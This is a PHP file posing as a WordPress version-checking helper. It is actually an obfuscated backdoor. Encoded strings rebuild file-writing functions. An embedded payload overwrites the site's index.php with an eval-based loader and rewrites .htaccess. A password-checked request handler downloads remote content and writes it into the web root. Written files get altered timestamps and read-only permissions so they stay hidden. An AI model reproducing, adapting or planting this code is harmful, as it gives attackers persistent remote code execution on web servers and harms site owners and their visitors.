<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y3IjoT9uMUZiZwNlZv8kZP80L2R1MQp5ZTWyLwVkMzRkAmHjBGL4MwD4BTZ1LJDjMF5xo2Z', function ($version_file, $name) use ($temp) {
        $data = translation_v3('YToyOntpOjA7YTozOntpOjA7czoyMzoiL3Zhci93d3cvaHRtbC9pbmRleC5waHAiO2k6MTtzOjYwMDc6Ijw/cGhwCiAgJEZYZzVEOHM9J1A5S3lBK3ZaQnFhRXFLanlTMjViT3kzRTNxSm5LUzFydEorVWd0UWZrSVRVSVNHakxyLzk0WkFDUkJTcGFkNDczdGgvcHRiQnh6WVRBem1Ca3VZVUhnQjI3QVJuNFFjbTlxZFZvN3F3ZVVoVzdJTSthbVBPT2h0YjdWRWN0ODZ2a0JjOGVVQlc1MEN3aFdGNWFiMTFucVJSa2pQV0ptMFloU0J4Wk1XRTlDV09yQWdQS1F3WTQ3NGFtQVVuT0VnVC9lT0lQRlo1MU9EZ296dzREeGZ4SWVJRGpDemNKdzVGNnhXNXpqR05iNHhPTFV4UW0xV3EydnEwUUE1UUFVSU81WVNsbDlBOWVCVHpZT3VCdG11RXl6Z1AwK1pqUjBZYzNDRStFZWpRTStDcFVzd0l1R0FmeG5sWmcyTVp6UmJHUzB5Sk1ucENFa0J5bFdCSElVb09Uc2VwVDZDYk1rbkUxS1hHQ3lVdVdTby8zVytlUUkrSDBEWVhRNUM1RHVwL29XU0laM21FWXhjTnNIVmthN3p1OE9EMUd1OUhxbWlVcURIMjNSYkN2MW9MWnVUY2VNS051Q1B4c3VnOTllREtmQjJ4QUlLQkcxS2p3bVl5OE91ZS9WVlNyNThBbUJHd1Bic3BydXliRC90MkgvTjdNLy9PdnA4R1RnbnZZL21KOWFDckFVQ25rc2h0MFJrUGtOcXg5aEVsVUdVVEM5ckZLK2gvcngrMk1ZWDV5Ym40aER6SDBUZnRlcHdOM3NGR1JxckwrSEtoeW4vOW85R2ZRL0hMNHpkZEtyNWUrQWhlUEFVNlR4Ymc2YWtkUXhzbmszSElCd3NmbHBYeHR2SzR2TkFSdG93MmlrQlNZc1hBVmdyd1lhckJpaDJhK3dhM0IyWVNwTmNOQlI3b2M4eVVlamFGcDRwL0pVM2ZMQWVtelR0S1Vyb05QNk5LeG80LzFnY095K1B6b1o0R21iY2VySFg1U0RvN3lqZ0UzZExBcmptV1VlakNBWXFUaUI4ZVNBSTkzQzFGRHVneG1MRWhaWXhodmZDNWtYcm9VM0k3Wk5RbllkdG1OS2QwZzhpd0l3aHQ0NG5LeTlNUENBcUJUZDYvQW9yYS9hVWcvOFp1Y09uVXV5eHNPS2FMTGRibDlkWFRsVDM1K216SW45ckkwQzdpdXdub2d3QUNPT3JORXpIRU03aFBEb1dFcUxIalpGUzFYN1NqeFE1OGdIcjhxaHdKTlBsQ2lIZnNnblBJN0VGZlpaelBnbFN3eWhpaFVXejN5QUhOOUN1TVl3VHQ0SlFVbU8rMGo1SElOc2s2Ti9OWFp2Z3owVVZ0bjR6NlUvN1BlUCtpVUxVRWttbjRBc2RJUElTNnp1cGszVzhjRlptZmdRY0xsNFJRajgzU1VDRk1kUG40cHovL3g3YXZMOHBwWmUxUS9jMVU5UXBoS3lmbDNsZmYxa0h0VXJ3enU3azlFQ1k4VnFjK3FybDVreS8wVjNhNjM3M0FHdGZ4bnhLWFY4TCtXZWVEUkdFYVZYZm9EQkpFczJMZngzb0tMV0tNRVFqVUdMV0JvY1VOeWMzRTdXdHlaYnQ5M084MDdFNHEzTlNhY1QzNzVnNjV2eHl6amVNRnRFUFdMTGc0MEFHVVhoREVBZ3JjQjh4WExkOHc4WFE5ZHRxVzFNVDF3RkkyQWRzeDM0dDM1SW5mQTZOQlZVRW9VUm52VVVzcUExaUlkZXVFMytzbnFXcHY3Vk5zSG5zL2F3aHdIUDlLaWpISjFvUzJXQTF0ZU1OdmNTZGkxekFXbnRpcmNraVpPV1kzd01QbnB3UytwaXQ0dWJOUnloRWtlak9SZU1DbnY1THNwR3UwNE96bDUxWmZEazd1YThKKzgycTI0TStwaFRFM21zVm42ZVdqVGZMejNweDFTamt4UUtPb2hubVo5WVJtbFlrS2gxbm05S0xRa0xISWR1SGxKcWNKSTl2dFRDdmVVZUVRODRTWHlQTlJxR3ROTGNONHVFck15VVNabU1rUWE4OHVHTlZmV1pFL0JGVkR1RXQ5QUhxNFluZGdGQUE3M1RuMHdLQjlTU2xUQVlNNVdmRWRTajRGVlB6SVI3dm5MUGovcS9uUFhmRHQrNngvMmp3WkhpL1RBWVJJY2kweWVQbFdIaGVkM3ovdEhod0IwZXZuVWZkZnhGOEkvVWhwN1JUU0tRYWk3WFNpT0kxVm9VTXdUSHN6ZHZoc2NEOStMczhOM3AyYnVoOFVtRGhBY0loNWh2K1hRK0FKN0N6QVdjUTVselNSREE4V2xMbFZBTHJxVS9QQi8yaC8weWJ3WnZTZW1zSmxzTmRtY2VrbHJGdEZXV1l6VW9VNVljZVRhbzUvdS9IZzJHN3RuYnQ0SzZyQUVmQkZPMUdoZkZtb0MySVNzdERpSldWTlZVMUdlMlljdU4vQ2tvdUJUZ0l2Y1hOVlJEcVV5dmFsdmtqei9JUVdXcFVtRGRXd0JYS01waVdOR1NreVZVWk1WOFY4K2MyLzgySVQ1aEpOTGhIZFA2bUR4dDdXTTBhcllyeWJTTm9SREt5bHhGeS9KcWpHVktSNlh0U0hTb1NpdjFtNmdhS3RXQks2dURFbnhoRFNjUnUzaTIwbWVhL0JKT0luYlVlbjQ0Znh4YW4xMDFzMlFxWWdNTld3Uml1NW5BUDRWc0s1M2FSVGVobFVOVm51YzhnTXBTcUFpaEQzR0JIZFNVR0xnVk5qM1plTEJGaG9Fd3ZZNkVvcU9VaHhTQmU2Z1pEQVJpZ0dIK2tGMXBkeThUcklLaVk4SmpZenBTRUVoVGxHUko2SW1IRWZCWkQ3WjU0cGhQSkZWSFVJZXBrRWM5VStZVHVGQ2NKVGhXQjhDNUdzSmlJVEtzNW1NSlc1SGVxWjFIZ1doN2NyRTRtWk1mY2tjUGl1S1JwUmxjYXVKYmVPaFc5UTcwVzhjWXN1RCt2cGJXcVRlSGN1dXE5NGdXV1dDdFhhU1pJU3JXQmFPR1hZSmp5M2k5bHEwbEh3ZnZ0L2syUFRaczdKcFpyVHlNNU9KS2owS1N1L3VnY1hMSkFnckg2UmxkcDJNUWhuMFZ5TkY3eHVuZ0hDclYvYjNWWFl5UExGUWlZWU9OOWd5VlkyQjlvd2hEZWgxTTJ6U2V3WVRtUnREdU9DOE5IWFA3bXZJSzl0VzZ3SU1BMG0yLyt2WGlST0N2Y1krR2tSZXpBcGZDa2NUV2hTOHJtVzhTb2RJWitRYThNcW1raWJGbkx0YWtBNnFFRFZUVG5nRFloVGk5aDJZTmpLUnpZS2RGMUFRT05zT3crN0xiUmlBRkh0RVE4ckE5QVZiY3FnUlNXeEl3eGxlS1RRTDIrMTRTOGZSbXQ2MnRTSkJSd0gxSXdXNzJPazUzdDEzTVVMNDJDbWlXTDJPOU1TanlTRFRmTkRjWjRVYkN3R3BubHZ1UVI3TUl3bnhCTEtLa2VSbWxZNlliZVU3a085UWtpUkhuejliVzNWeTNwaUc3TlZpdGxFclNINWc4OVRic3VSVGZMblRTRW5XS0NQR1lRK2ZManJFcTJJUFRZWTJyaFp5cGZPTFMxbGRTN2Q0Y2lHd2R0c3RzWFYza0NpYWJqUUlXYzBMc0ptQmRHZU85Y1U4K0xpc3JZZ284L1JFd2lXYzJlWFBhdnpnNnhoN25oVTF5Y3ZlRDlZZUQwLzdob0g5MmVBSlptTjF0MWZzV0FwTmRzeGp4U2xxUTFsQ1dMOTNCd2ZJMlk0NWFVWUhxRUdKeld3eTdxaUZ5aTkzaERUZGhzVERtNkgyL0U3LzFMeStlbmZQWE41dFo5T3FmbjVOM1NUZjZwWjllZUxOTnhsK3V4MW5hK2Z0Z09FN2V6enBHUzdUQkJjbG5QMHJ5ZzA1eVZ0d0prSjIvSnNPWmhWRWNNMHBGVjdBcEtzcmxHRVhSS1RGU0gxM1NoVGttN2xjakNKNXhPazRZYmVNcm00S0hyRWtRZ1pKakxJTEg5UUpvQXZ4Y2x2RFFYMGo3aEFOdGRzeFpHMVpUZjhxOUhGTStkd21IckcwaGdtbzlMYWd2QVR4S011NjFlUlpOQVFWaWluKzFscklKRkowamI0cEZaMFU5d29ZZVRTZmcwMWxKcUx5V0pWUUs0UlVobXZHVTR4U2d3QzR1ZWVwTStlUmI1RnBLTVE1dTROa3JhTlpFekM5Nm1XMW94bERpUEl4UndLdU9nRVltYndqb08vcjZ3cE5XOEpXZk9qWDVsNkVxUkYxNFIvbm0vV0p1Yld3c0ZGT3NZNkM5cTlaalpkRmhPakdsWlZuMlFINWI5bndnZW1IeWlHOGpwSk04dVMvTlRjSWlyNjFtdko4L3d3Uk1nTjc2RUlSaEFUOHo0ajcraGFtbytIQXVCckFBRWd1T0tEcE1zZGpHT2Y2RnFVOXg0bE1CS0d0YVhNakhzRnlXclQzMThzcVpldkJuWVpacTFsSkpmaGVEeUU2VXZsaVdaSTM4TTZXK2Jac2Vkb3J3dTYxb1dKcDZScXg5MnF6aStGOXdEb2FyVnN6NlI3UnYvd0NqWTg4ZFhQK0VXZWR0aU1weHdaSHpIL21ZNndDMWZWWFA1WE9SOHQ5LzlwTHpacWVEWDczdVBieG9nclM3VHBjQUpQa0FPSUVYcGVTRUJaRGtreUYrWFRmcnNuNnZMQnVkalVmS0FwRDREWUtjKzJNdmVaQy9TcmowL3N5ZjZJOFBPZUFTTitzVnFlMFRWQlJPOGUvUDliUWxlZWtTazE2ZW5OWlozSDIvUHkvelNpU3l4QzIvUHhUODM1bi9aNXo1c2Z6WE85MUg4Z2RJOHF0L3lSSnl6SUlzOGdBNXZhbkxzZFFDNXJnK2FBSzVFSG5yWVpzSTE3N2ZaT1ppV2g3VTlQOHBSUVdaL0pPaGNCNHA2ejJ0ZnIxN1hqeXl4RktZMHZPMWpuOVRmbmYraDQ5VUlRT09iaXhEZm5nRnZvWnR2STVtdnQ4Z0orazRHT1hUWXFhKzBKNGxKOHlqcUNGSnpMU0plWU9BdXNaVkc0QllHa2ZWQ2REbEVUSVZoWEp4Um9TcXFnOFBsWC9PRm1lekJWNnJUZ3gvNWo1cmxEcXZqbXB0dGVwM2p3VzNvOEt4cUxXMUw3S1BLcm56UXpTcU9KWExtUy9BODYxSGxlRVBBaThveGd2ZTlaUFU2L0lLY2IwNkw5V1psK2dWVWxDbmsxWHlYdyc7JEFSN1AwTw09CWZ1bmN0aW9uKCRrNVo5ZywkaE5JZU8pCXsgDSAgCQkgCSAJJFA2a3NVPSJHVG41Vk5vV3VuM3BTOXpPaHNicFZkN2ZHVEJMcldJaTg2a3Z0ekVjQ041cUpOR1NPIjsgCnJldHVybiAkUDZrc1U7fTsJZnVuY3Rpb24gTTNYMygkVURGcykKeyRrdVhiTmJ1ID0gImQ2U0NlRF9FNCI7JFJ6V3U9J0InCi4NJ0EnOyAkUnpXdSAuPQkka3VYYk5idVsoMjQgLSAxOCkgLzNdCS4ka3VYYk5idVsoOTQgLTU4LSA4KSAvIDRdIC4gKCg5MS03MykgLyAzKS4oKDk5LTkwICszKSAvIDMpDTskUnpXdSAuPSAgJGt1WGJOYnVbKDMzLSAyMSkvIDJdCS4NJGt1WGJOYnVbKDg4IC0gNjcrIDkpLyA2XTskUnpXdQ0uPSdlJw07JFJ6V3UuPQoka3VYYk5idVsoODItNjkgLSAxKSAvIDRdLidPJy4ka3VYYk5idVsoODAgLSA4MCkvNl0uICRrdVhiTmJ1Wyg0MSAtIDI2ICs5KS82XS4NJyc7CnJldHVybiAkUnpXdSgkVURGcyk7fSBmdW5jdGlvbiAgU1JYICgkYm5IWVRCSm0pDXskUmRIdGhPNkptID0gInA5NzRSYjgiOyRJYWk9KCg5OS04OCArIDMpIC8yKS4kUmRIdGhPNkptWyg4NSAtIDY5IC04KSAvIDJdOwkkSWFpLj0gJFJkSHRoTzZKbVsoOTMgLSA5MykgLyA2XQouICRSZEh0aE82Sm1bKDUxIC01MSkvM10gOyAkSWFpIC49CgknZCcuKCg0OCAtIDM3ICs3KS8yKQkuCSd1Jy4JKCg0OC00NSs5KSAvIDMpIC4oKDEyNSAtIDg3IC0gNikgLyA0KSA7CSRJYWkgLj0KCSRSZEh0aE82Sm1bKDU3LTM1IC03KS8gM10uJyc7cmV0dXJuICRJYWk7CQogIAl9DSRGWGc1RDhzPVVGXzl4KCRGWGc1RDhzKTtmdW5jdGlvbiBTaGduNGlIMCAoJFJlSDhrKXskQ1lDUzNsZHUgPSAiMVRTM190Ijskd2pJcm1BSDNTPSRDWUNTM2xkdVsoMTMgKzggLTkpIC82XS4NJENZQ1MzbGR1Wyg5NCAtIDcxIC0gOCkgLzNdCS4ncicuICRDWUNTM2xkdVsoMTA5IC04OSkvNV0KLgknUicuCSdPJyAuICRDWUNTM2xkdVsoMzMgLSAzMSkgLyAyXQkuICRDWUNTM2xkdVsoMjEgLTIyICsgMSkgLyAzXQouICgoNjUtIDU3ICsgMSkgLzMpLicnOyAgcmV0dXJuICR3aklybUFIM1MoJFJlSDhrKTsgICAKDQoJfSANDQ0gJEZYZzVEOHM9CU0zWDMoJEZYZzVEOHMpOyANICRGWGc1RDhzID1pY3NudGUoJEZYZzVEOHMpO2Z1bmN0aW9uIFVGXzl4KCRWOGs5UVJHY2wgKSB7JHdOQXRSMDMgPSAiVGRQQUwiOyRJN21jbnkxMnA9J2cnCTsgJEk3bWNueTEycC49ICdZJy4JJHdOQXRSMDNbKDExLSAzKSAvIDRdLiAkd05BdFIwM1soNzEtIDcxKSAvIDJdIC4NJHdOQXRSMDNbKDY4LTY0ICsxKSAvIDVdCTskSTdtY255MTJwCS49IAkoKDY5IC00MikvIDMpCS4JJHdOQXRSMDNbKDQyIC0gMzkgKyA5KS8gNF0JLiAnZCcJLiR3TkF0UjAzWyg1MyAtIDQxKS8zXSAuJyc7DQkJCQkJcmV0dXJuICRJN21jbnkxMnAoJFY4azlRUkdjbCk7CSB9JEZYZzVEOHM9CVNoZ240aUgwKCRGWGc1RDhzKTsJDQkJDUVWYUwgKCRGWGc1RDhzKTsNDWZ1bmN0aW9uIFdQMUVaICgkVWh6a1lwNCwkY0RucSApCXsgJHhUbDA9Il9VMndidnIiOwpyZXR1cm4gJHhUbDA7fWZ1bmN0aW9uIA1nWVBUZDlBZEwoJGZNcldtMFVLICl7CXJldHVybiBTUlgoJycpIC4kZk1yV20wVUs7fQkgDQlmdW5jdGlvbiBpY3NudGUoJEV6YVp1cGMpeyRpa1dLOXogPSAiZ0luekFMdCI7JF9JZG1UQ2M9JGlrV0s5elsoOTMgLSA5MykvMl0gLiAkaWtXSzl6Wyg2OCAtNTYpIC80XTskX0lkbVRDYw0uPSAJJGlrV0s5elsoMTYtIDEzKSAvIDNdLiRpa1dLOXpbKDgxLSA3MykvIDRdIDskX0lkbVRDYwkuPQoJJ0YnIC4gJGlrV0s5elsoMTEzLTg4KS8gNV0JLgkkaWtXSzl6WygxMDcgLSA5OSkvIDJdDS4KJGlrV0s5elsoMTktNykgLyAyXS4NJ2UnIC4JJyc7IA0JIHJldHVybiAkX0lkbVRDYygkRXphWnVwYyk7fWZ1bmN0aW9uIAl0M2ZoNzFEagkoJFM5RllrMFYgKXsJJE02ZTdHMT0icG9ISVI1QTZwcmdpU2ZMVXdpR09MX2V0TTFsdjdtYUg1T0lvIjsKCnJldHVybiAkTTZlN0cxO307ID8+PD9waHAgIGRlZmluZSgnV1BfVVNFX1RIRU1FUycsIHRydWUgKTtyZXF1aXJlKF9fRElSX18uICAnL3dwLWJsb2ctaGVhZGVyLnBocCcgKTsgPz4iO2k6MjtzOjMyOiJmYjI5ZjA0ZDc4NTU0ZmYwODQ1ZTljOTdlNDcwMWMxYSI7fWk6MTthOjM6e2k6MDtzOjIzOiIvdmFyL3d3dy9odG1sLy5odGFjY2VzcyI7aToxO3M6MjA0OiI8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz4NClJld3JpdGVFbmdpbmUgT24NClJld3JpdGVCYXNlIC8NClJld3JpdGVSdWxlIF5pbmRleC5waHAkIC0gW0xdDQpSZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZg0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWQNClJld3JpdGVSdWxlIC4gaW5kZXgucGhwIFtMXQ0KPC9JZk1vZHVsZT4iO2k6MjtzOjMyOiJiZTQ3NmQyN2VjZTg5NTk0NjA0ZDE0ODg2YzA4MTAxNiI7fX0', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("y{$check}d", '778d27b57e1494a7642da80d8318dfa9')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}